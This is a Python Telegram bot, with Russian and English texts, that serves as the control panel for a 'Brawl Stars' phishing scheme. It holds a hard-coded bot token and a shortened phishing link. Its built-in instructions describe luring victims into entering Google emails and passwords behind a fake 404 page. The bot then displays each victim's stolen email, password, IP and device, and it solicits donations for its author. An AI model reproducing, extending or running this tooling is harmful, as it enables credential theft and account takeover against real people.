import requests
import time
import json
from datetime import datetime

BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
ADMIN_ID = 8744429026
ADMIN_USERNAME = "NeresVoid"
PHISHING_URL = "https://da.gd/tzO5QW"

last_update_id = 0
victims = []
user_language = {}
tickets = {}
admin_reply_context = {}

# ========== ТЕКСТЫ ==========
TEXTS = {
    'ru': {
        'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
        'start_user': "🎉 **Добро пожаловать!** 🎉\n\n🔹 Используй кнопки ниже для связи с администратором.\n🔹 По всем вопросам создавай тикет — ответят в ближайшее время.",
        'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку жертве\n2️⃣ Жертва вводит почту и пароль Google\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит ошибку 404\n\n⚠️ Ссылка всегда одна: {url}",
        'data_empty': "📭 **Нет данных**\n\nПока нет ни одной жертвы.",
        'data_title': "👥 **Последние 5 жертв:**\n\n",
        'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
        'donate_25': "✨ **ПОДДЕРЖАТЬ АВТОРА (25⭐)** ✨\n\nНажми на кнопку ниже, чтобы отправить **25 Telegram Stars**.\n\n⭐ 25 звёзд ≈ 50 рублей\n\nСпасибо за поддержку! 💙",
        'donate_50': "✨ **ПОДДЕРЖАТЬ АВТОРА (50⭐)** ✨\n\nНажми на кнопку ниже, чтобы отправить **50 Telegram Stars**.\n\n⭐ 50 звёзд ≈ 100 рублей\n\nСпасибо за поддержку! 💙",
        'donate_100': "✨ **ПОДДЕРЖАТЬ АВТОРА (100⭐)** ✨\n\nНажми на кнопку ниже, чтобы отправить **100 Telegram Stars**.\n\n⭐ 100 звёзд ≈ 200 рублей\n\nСпасибо за поддержку! 💙",
        'ticket_created': "✅ **Тикет создан!**\n\nНапиши свой вопрос ниже. Администратор ответит в этом чате.\n\n⚠️ Чтобы закрыть тикет, отправь /close",
        'ticket_already_active': "❌ **У тебя уже есть активный тикет!**\n\nЗакрой его командой /close",
        'ticket_closed': "✅ **Тикет закрыт!**\n\nЕсли остались вопросы — создай новый кнопкой «Поддержка»",
        'no_active_ticket': "❌ У тебя нет активных тикетов.\n\nНажми «Поддержка», чтобы создать.",
        'reply_from_admin': "📩 **Ответ от администратора:**\n\n{text}",
        'user_message': "📩 **Сообщение от пользователя**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Сообщение:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Тикет #{ticket_id}",
        'reply_sent': "✅ Ответ отправлен пользователю @{username}",
        'admin_reply_instruction': "✏️ **Ответ пользователю @{username}**\n\nНапиши текст ответа ниже:",
        'language_changed': "✅ Язык: Русский",
        'language_changed_en': "✅ Language: English",
        'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
        'new_message_to_admin': "✅ Сообщение отправлено администратору. Ответ придёт сюда.",
        'btn_data': "📋 Данные жертв",
        'btn_stats': "📊 Статистика",
        'btn_donate': "⭐ Поддержать автора",
        'btn_instruction': "📖 Инструкция",
        'btn_settings': "⚙️ Настройки",
        'btn_back': "🔙 Назад",
        'btn_support': "📩 Поддержка",
        'btn_donate_25': "⭐ 25 звёзд",
        'btn_donate_50': "⭐ 50 звёзд",
        'btn_donate_100': "⭐ 100 звёзд",
        'btn_lang_ru': "🇷🇺 Русский",
        'btn_lang_en': "🇬🇧 English"
    },
    'en': {
        'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims caught:** {count}\n\n📌 Send the link to victim — data will come here.",
        'start_user': "🎉 **Welcome!** 🎉\n\n🔹 Use buttons below to contact admin.\n🔹 For any questions, create a ticket — you'll get a reply soon.",
        'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link to victim\n2️⃣ Victim enters Google email and password\n3️⃣ Data comes here\n4️⃣ Victim sees 404 error\n\n⚠️ Link is always the same: {url}",
        'data_empty': "📭 **No data**\n\nNo victims yet.",
        'data_title': "👥 **Last 5 victims:**\n\n",
        'stats': "📊 **STATISTICS**\n\n👨‍💼 Total victims: {total}\n🌐 Unique IPs: {unique}",
        'donate_25': "✨ **SUPPORT THE AUTHOR (25⭐)** ✨\n\nClick the button below to send **25 Telegram Stars**.\n\n⭐ 25 stars ≈ $0.5\n\nThank you for your support! 💙",
        'donate_50': "✨ **SUPPORT THE AUTHOR (50⭐)** ✨\n\nClick the button below to send **50 Telegram Stars**.\n\n⭐ 50 stars ≈ $1\n\nThank you for your support! 💙",
        'donate_100': "✨ **SUPPORT THE AUTHOR (100⭐)** ✨\n\nClick the button below to send **100 Telegram Stars**.\n\n⭐ 100 stars ≈ $2\n\nThank you for your support! 💙",
        'ticket_created': "✅ **Ticket created!**\n\nWrite your question below. Admin will answer in this chat.\n\n⚠️ To close ticket, send /close",
        'ticket_already_active': "❌ **You already have an active ticket!**\n\nClose it with /close",
        'ticket_closed': "✅ **Ticket closed!**\n\nIf you have more questions — create a new ticket with 'Support' button",
        'no_active_ticket': "❌ You have no active tickets.\n\nPress 'Support' to create one.",
        'reply_from_admin': "📩 **Reply from admin:**\n\n{text}",
        'user_message': "📩 **Message from user**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Message:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Ticket #{ticket_id}",
        'reply_sent': "✅ Reply sent to user @{username}",
        'admin_reply_instruction': "✏️ **Reply to user @{username}**\n\nWrite your reply below:",
        'language_changed': "✅ Language: English",
        'language_changed_ru': "✅ Язык: Русский",
        'settings': "⚙️ **SETTINGS**\n\nChoose language:",
        'new_message_to_admin': "✅ Message sent to admin. Reply will come here.",
        'btn_data': "📋 Victim data",
        'btn_stats': "📊 Statistics",
        'btn_donate': "⭐ Support author",
        'btn_instruction': "📖 Instruction",
        'btn_settings': "⚙️ Settings",
        'btn_back': "🔙 Back",
        'btn_support': "📩 Support",
        'btn_donate_25': "⭐ 25 stars",
        'btn_donate_50': "⭐ 50 stars",
        'btn_donate_100': "⭐ 100 stars",
        'btn_lang_ru': "🇷🇺 Русский",
        'btn_lang_en': "🇬🇧 English"
    }
}

def get_text(chat_id, key, **kwargs):
    lang = user_language.get(chat_id, 'ru')
    text = TEXTS[lang].get(key, TEXTS['ru'][key])
    return text.format(**kwargs) if kwargs else text

def get_button_text(chat_id, key):
    lang = user_language.get(chat_id, 'ru')
    return TEXTS[lang].get(key, TEXTS['ru'][key])

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Ошибка отправки: {e}")

def edit_message(chat_id, message_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Ошибка редактирования: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    requests.post(url, json={"callback_query_id": callback_id})

def get_main_keyboard(chat_id):
    if chat_id == ADMIN_ID:
        return [
            [{"text": get_button_text(chat_id, 'btn_data'), "callback_data": "data"}, {"text": get_button_text(chat_id, 'btn_stats'), "callback_data": "stats"}],
            [{"text": get_button_text(chat_id, 'btn_donate'), "callback_data": "donate"}],
            [{"text": get_button_text(chat_id, 'btn_instruction'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'btn_settings'), "callback_data": "settings"}]
        ]
    else:
        return [
            [{"text": get_button_text(chat_id, 'btn_support'), "callback_data": "create_ticket"}],
            [{"text": get_button_text(chat_id, 'btn_instruction'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'btn_settings'), "callback_data": "settings"}]
        ]

def get_back_keyboard(chat_id):
    return [[{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]]

def get_language_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'btn_lang_ru'), "callback_data": "lang_ru"}, {"text": get_button_text(chat_id, 'btn_lang_en'), "callback_data": "lang_en"}],
        [{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]
    ]

def get_donate_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'btn_donate_25'), "callback_data": "donate_25"}],
        [{"text": get_button_text(chat_id, 'btn_donate_50'), "callback_data": "donate_50"}],
        [{"text": get_button_text(chat_id, 'btn_donate_100'), "callback_data": "donate_100"}],
        [{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]
    ]

def get_ticket_keyboard(chat_id, ticket_id):
    return [[{"text": get_button_text(chat_id, 'btn_back'), "callback_data": f"close_ticket_{ticket_id}"}]]

def get_victims_keyboard(chat_id, victims_list):
    keyboard = []
    for i, v in enumerate(victims_list[:5]):
        victim_id = len(victims) - i - 1
        keyboard.append([{"text": f"📧 {v['email'][:20]}...", "callback_data": f"victim_{victim_id}"}])
    keyboard.append([{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}])
    return keyboard

def get_admin_reply_keyboard(user_id, username, ticket_id):
    return [[{"text": get_button_text(ADMIN_ID, 'btn_back'), "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]

def generate_ticket_id():
    return int(time.time()) % 1000000

def create_ticket(user_id, username):
    ticket_id = generate_ticket_id()
    tickets[user_id] = {"active": True, "ticket_id": ticket_id, "username": username, "messages": []}
    return ticket_id

def close_ticket(user_id):
    if user_id in tickets and tickets[user_id]["active"]:
        tickets[user_id]["active"] = False
        return True
    return False

def get_active_ticket(user_id):
    return tickets.get(user_id) if tickets.get(user_id, {}).get("active") else None

print("✅ Бот запущен на Railway!")

while True:
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
        response = requests.get(url).json()

        for update in response.get("result", []):
            last_update_id = update["update_id"]
            message = update.get("message", {})
            callback = update.get("callback_query", {})

            if message:
                chat_id = message.get("chat", {}).get("id")
                username = message.get("chat", {}).get("username", "нет")
                text = message.get("text", "")
                
                if chat_id == ADMIN_ID:
                    if text == "/start":
                        send_message(chat_id, get_text(chat_id, 'start_admin', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
                    elif chat_id in admin_reply_context and admin_reply_context[chat_id].get("waiting_reply"):
                        target = admin_reply_context[chat_id]
                        send_message(target["user_id"], get_text(target["user_id"], 'reply_from_admin', text=text))
                        send_message(chat_id, get_text(chat_id, 'reply_sent', username=target["username"]))
                        admin_reply_context[chat_id] = {}
                    else:
                        send_message(chat_id, "✅ Сообщение получено")
                
                else:
                    if text == "/start":
                        send_message(chat_id, get_text(chat_id, 'start_user'), get_main_keyboard(chat_id))
                    elif text == "/close":
                        if close_ticket(chat_id):
                            send_message(chat_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
                        else:
                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))
                    else:
                        ticket = get_active_ticket(chat_id)
                        if ticket:
                            send_message(ADMIN_ID, get_text(ADMIN_ID, 'user_message', user_id=chat_id, username=username, text=text, ticket_id=ticket["ticket_id"]), get_admin_reply_keyboard(chat_id, username, ticket["ticket_id"]))
                            send_message(chat_id, get_text(chat_id, 'new_message_to_admin'))
                        else:
                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))

            if callback:
                chat_id = callback.get("from", {}).get("id")
                data = callback.get("data")
                callback_id = callback.get("id")
                message_id = callback.get("message", {}).get("message_id")
                username = callback.get("from", {}).get("username", "нет")

                if data == "create_ticket":
                    if get_active_ticket(chat_id):
                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_already_active'), get_back_keyboard(chat_id))
                    else:
                        ticket_id = create_ticket(chat_id, username)
                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_created'), get_back_keyboard(chat_id))
                
                elif data.startswith("close_ticket_"):
                    if close_ticket(chat_id):
                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
                
                elif data.startswith("admin_reply_"):
                    parts = data.split("_")
                    admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": int(parts[2]), "username": parts[3], "ticket_id": int(parts[4])}
                    send_message(chat_id, get_text(chat_id, 'admin_reply_instruction', username=parts[3]))
                
                elif data == "back":
                    if chat_id == ADMIN_ID:
                        edit_message(chat_id, message_id, get_text(chat_id, 'start_admin', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
                    else:
                        edit_message(chat_id, message_id, get_text(chat_id, 'start_user'), get_main_keyboard(chat_id))
                
                elif data == "donate":
                    edit_message(chat_id, message_id, "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери сумму:", get_donate_keyboard(chat_id))
                
                elif data == "donate_25":
                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_25'), [[{"text": get_button_text(chat_id, 'btn_donate_25'), "url": "https://t.me/telegram?start=star25"}]])
                
                elif data == "donate_50":
                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_50'), [[{"text": get_button_text(chat_id, 'btn_donate_50'), "url": "https://t.me/telegram?start=star50"}]])
                
                elif data == "donate_100":
                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_100'), [[{"text": get_button_text(chat_id, 'btn_donate_100'), "url": "https://t.me/telegram?start=star100"}]])
                
                elif data == "instruction":
                    edit_message(chat_id, message_id, get_text(chat_id, 'instruction', url=PHISHING_URL), get_back_keyboard(chat_id))
                
                elif data == "settings":
                    edit_message(chat_id, message_id, get_text(chat_id, 'settings'), get_language_keyboard(chat_id))
                
                elif data == "lang_ru":
                    user_language[chat_id] = 'ru'
                    edit_message(chat_id, message_id, get_text(chat_id, 'language_changed'), get_back_keyboard(chat_id))
                
                elif data == "lang_en":
                    user_language[chat_id] = 'en'
                    edit_message(chat_id, message_id, get_text(chat_id, 'language_changed_en'), get_back_keyboard(chat_id))
                
                elif data == "data" and chat_id == ADMIN_ID:
                    if not victims:
                        edit_message(chat_id, message_id, get_text(chat_id, 'data_empty'), get_back_keyboard(chat_id))
                    else:
                        last_victims = victims[-5:]
                        keyboard = get_victims_keyboard(chat_id, last_victims)
                        edit_message(chat_id, message_id, get_text(chat_id, 'data_title'), keyboard)
                
                elif data.startswith("victim_"):
                    idx = int(data.split("_")[1])
                    if 0 <= idx < len(victims):
                        v = victims[idx]
                        text = f"📧 **Email:** {v['email']}\n🔑 **Пароль:** {v['password']}\n📡 **IP:** {v['ip']}\n📱 **Устройство:** {v['device']}\n⏰ **Время:** {v['time']}"
                        edit_message(chat_id, message_id, text, get_back_keyboard(chat_id))
                
                elif data == "stats" and chat_id == ADMIN_ID:
                    unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
                    edit_message(chat_id, message_id, get_text(chat_id, 'stats', total=len(victims), unique=unique_ips), get_back_keyboard(chat_id))
                
                answer_callback(callback_id)

        time.sleep(1)

    except Exception as e:
        print(f"Ошибка: {e}")
        time.sleep(5) 
